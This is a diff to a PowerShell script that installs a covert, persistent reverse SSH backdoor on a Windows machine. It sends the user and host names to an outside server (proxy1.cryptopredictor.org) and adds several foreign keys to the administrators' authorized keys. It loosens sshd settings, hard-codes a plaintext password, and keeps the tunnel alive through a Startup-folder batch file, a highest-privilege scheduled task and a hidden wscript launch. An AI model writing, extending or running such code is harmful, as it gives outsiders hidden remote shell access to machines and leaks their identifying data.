@@ -11,6 +11,9 @@ if ($opensshServer.State -ne "Installed") {
     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 }
 
+# We can try a directly install using ssh latest release
+# Invoke-WebRequest https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.8.3.0p2-Preview/OpenSSH-Win64.zip
+
 # Start and enable sshd
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
@@ -44,16 +47,17 @@ $logFile = "$userProfile\rev_ssh.log"
 #$batFilePath = "$neutralPath\rev_ssh.bat"
 $batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.bat"
 
+
 # Encode the data as base64 without newline
 $data = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$username`:$hostname"))
 
 # Request port to backend
-$domain_name = "$remote_host"
-$response = Invoke-RestMethod -Uri "https://$domain_name/report?data=$data" -Method Get
+$domain_name = "proxy1.cryptopredictor.org"
+$response = Invoke-RestMethod -Uri "https://$domain_name/report?data=$data" -UseBasicParsing
 
 # Clean response (remove any percent signs)
-$received_port = $response -replace '%', ''
-$received_port
+$receivedPort = $response -replace '%', ''
+$receivedPort
 
 # Create C:\ProgramData\revssh if it doesn't exist
 if (-not (Test-Path $neutralPath)) {
@@ -75,10 +79,11 @@ if (-not (Test-Path "$env:ProgramData\ssh")) {
 # Remote public keys
 $publicKeys = @(
     "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPcs8MvplmfDZ6KDleh7oS9HusQbJVWmRJC7JfOQRtzG",
-    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFzdTi7eKOCK1jqc60ORaP5QtdR3fmI3SXA3DePTCRPS",
-    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfWGblM3hG4bwrALVaC0mWhnzdPeolZjUAvd0l6Eolk nobody1@z6yg5ybv",
-    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeQigM/aHDiVVl06SaUioJ9yll+4v+OsADC8WYdSLWz nobody2@z6yg5ybv",
-    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDRLi7rEJe7OkorAvywhr6QRLN1p0FmWDAKRTpDPtJwa suser@z6yg5ybv"
+	"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFzdTi7eKOCK1jqc60ORaP5QtdR3fmI3SXA3DePTCRPS",
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfWGblM3hG4bwrALVaC0mWhnzdPeolZjUAvd0l6Eolk nobody1",
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeQigM/aHDiVVl06SaUioJ9yll+4v+OsADC8WYdSLWz nobody2",
+	"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7GlY/RI7o9IjHccolpcUSa1/UFsmMrQFCvzcs2JqLm suser",
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDRLi7rEJe7OkorAvywhr6QRLN1p0FmWDAKRTpDPtJwa suser"
 )
 
 # Ensure the SSH directory exists in ProgramData
@@ -97,6 +102,7 @@ foreach ($key in $publicKeys) {
 }
 
 # Path to sshd_config
+mkdir "$env:ProgramData\ssh\"
 $sshConfigPath = "$env:ProgramData\ssh\sshd_config"
 
 # Ensure the file exists
@@ -123,6 +129,15 @@ GatewayPorts yes
 PermitTTY yes
 TCPKeepAlive yes
 PermitTunnel yes
+
+PermitOpen any
+X11Forwarding yes
+PrintMotd no
+PrintLastLog yes
+TCPKeepAlive yes
+ClientAliveInterval 60
+ClientAliveCountMax 10
+UseDNS yes
 "@
 
 # Overwrite sshd_config with your custom settings
@@ -134,29 +149,34 @@ Write-Host "[+] sshd_config has been fully configured with secure settings."
 
 # Set correct permissions
 icacls.exe "$env:ProgramData\ssh\administrators_authorized_keys" /inheritance:r /grant ""*S-1-5-32-544:F"" /grant "SYSTEM:F"
-#icacls.exe "$env:USERPROFILE\.ssh\authorized_keys" /inheritance:r /grant "${env:USERNAME}:(F)" /grant "SYSTEM:F"
-#icacls.exe "$keyFile" /grant "${env:USERNAME}:(F)"
-#icacls.exe "$keyFile" /grant "SYSTEM:F"
 
 # Create an accesible version of ssh
 $targetPath = "C:\ProgramData\ssh_portable"
 New-Item -ItemType Directory -Path $targetPath -Force
 Copy-Item -Path "C:\Windows\System32\OpenSSH\*" -Destination $targetPath -Recurse
 
+# Install needed modules
+Install-Module -Name Posh-SSH
 
 # Add public key to remote server
 $publicKey = (Get-Content $pubKeyFile -Raw).Trim()
 
 #ssh -o "StrictHostKeyChecking=no" -i $keyFile $user@$remote_host "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
-& "C:\ProgramData\ssh_portable\ssh.exe" -o "StrictHostKeyChecking=no" -i $keyFile "$user@$remote_host" "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+#& "C:\ProgramData\ssh_portable\ssh.exe" -o "StrictHostKeyChecking=no" -i $keyFile "$user@$remote_host" "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
 
-# Create the batch content with properly escaped quotes
-#$batContent = @"
-#@echo off
-#echo [INFO] Starting reverse SSH tunnel at %date% %time% by %USERNAME% >> "$logFile"
-#timeout /t 10 /nobreak > nul
-#"C:\Windows\System32\OpenSSH\ssh.exe" -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R ${receivedPort}:127.0.0.1:22 ${user}@${remote_host} >> "$logFile" 2>&1
-#"@
+Import-Module Posh-SSH -Force -Confirm
+
+$password = "DZ04dYFws1POVlm0XeHA" | ConvertTo-SecureString -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential("suser", $password)
+
+# Create the session
+$session = New-SSHSession -ComputerName $remote_host -Credential $credential -AcceptKey
+
+# Run the command
+Invoke-SSHCommand -SSHSession $session -Command "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys"
+
+# Close the session
+Remove-SSHSession -SSHSession $session
 
 # Setup powershell as default shell
 New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force
@@ -164,13 +184,13 @@ New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Wi
 # Create the batch content with properly escaped quotes
 $batContent = @"
 @echo off
-echo [INFO] Trying reverse SSH tunnel at %%date%% %%time%% by %%USERNAME%% using $receivedPort port on remote host>> "$logFile"
+echo [INFO] Trying reverse SSH tunnel at %%date%% %%time%% by %%USERNAME%% using $receivedPort port on remote host >> "$logFile"
 timeout /t 30 /nobreak > nul
-C:\ProgramData\ssh_portable\ssh.exe -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R $receivedPort`:127.0.0.1`:22 $user@$remote_host >> "$logFile" 2>&1
+C:\ProgramData\ssh_portable\ssh.exe -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -f -R ${receivedPort}:127.0.0.1:22 $user@$remote_host >> "$logFile" 2>&1
 if %%ERRORLEVEL%% EQU 0 (
-    echo [SUCCESS] SSH tunnel established successfully at %date% %time% >> "$logFile"
+    echo [SUCCESS] SSH tunnel established successfully at %%date%% %%time%% >> "$logFile"
 ) else (
-    echo [ERROR] SSH tunnel failed with error code %ERRORLEVEL% at %date%% %time%% >> "$logFile"
+    echo [ERROR] SSH tunnel failed with error code %%ERRORLEVEL%% at %%date%% %%time%% >> "$logFile"
 )
 "@
 
@@ -210,7 +230,6 @@ Set-Content -Path $vbsFilePath -Value $vbsContent -Encoding ASCII
 $taskName = "ReverseSSHTunnel"
 
 # Define the action to run the reverse SSH tunnel batch file
-#$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""
 $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$batFilePath`""
 
 # Remove the task if it already exists
@@ -233,12 +252,10 @@ Register-ScheduledTask -TaskName $taskName `
     -Settings $settings `
     -RunLevel Highest
 
-
-#Register-ScheduledTask -TaskName $taskName `
-#    -Trigger $trigger `
-#    -Action $action `
-#    -Settings $settings `
-#    -RunLevel Highest `
-#    -User $username
-
 Write-Host "`n[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
+
+# Trigger the Scheduled Task immediately
+Start-ScheduledTask -TaskName $taskName
+Start-Process "wscript.exe" -ArgumentList "`"$vbsFilePath`"" -WindowStyle Hidden
+
+Write-Host "[+] Reverse tunnel initiated in the background."
